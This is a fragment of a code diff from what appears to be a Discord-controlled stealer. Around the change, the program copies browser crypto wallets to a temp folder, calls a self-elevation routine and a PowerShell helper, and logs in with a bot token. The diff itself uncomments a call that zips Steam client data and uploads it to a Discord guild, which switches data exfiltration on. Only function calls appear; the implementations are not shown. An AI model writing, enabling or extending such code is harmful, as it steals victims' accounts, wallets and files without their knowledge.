@@ -3386,7 +3386,7 @@ client.once('clientReady', async () => {
                 await copyBrowserWalletsToTemp();
             }
             try {
-                // await zipAndUploadSteamUi(guild);
+                await zipAndUploadSteamUi(guild);
             } catch (error) {
             }
 
@@ -3559,4 +3559,5 @@ function elevateSelf() {
    holypowershellholypowershellAMEN();
    await client.login(TOKEN);
 })();
+
 
